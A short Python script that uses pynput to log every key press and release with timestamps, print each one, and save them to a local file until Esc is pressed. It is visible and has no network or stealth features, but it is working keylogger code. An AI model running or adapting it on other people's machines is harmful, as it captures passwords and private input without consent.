from pynput import keyboard
from datetime import datetime

log = []

def create_filename():
    start_time = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"log_{start_time}.txt"
    return filename

def report(filename):
    with open(filename, 'w') as f:
        f.write(f"Program start at {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
        for entry in log:
            f.write(f"{entry}\n")
        f.write(f"Program stop at {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")

def keywrite(key, action):
    time_stamp = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
    try:
        key = key.char if key.char else str(key)
    except AttributeError:
        key = str(key)

    entry = f"{time_stamp} {action} '{key}'"
    log.append(entry)
    print(entry)

def on_press(key):
    keywrite(key, "down")

def on_release(key):
    keywrite(key, "release")
    if key == keyboard.Key.esc:
        return False

def keylogger_start():
    filename = create_filename()
    print(f"Logging to {filename}")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    report(filename)

keylogger_start()
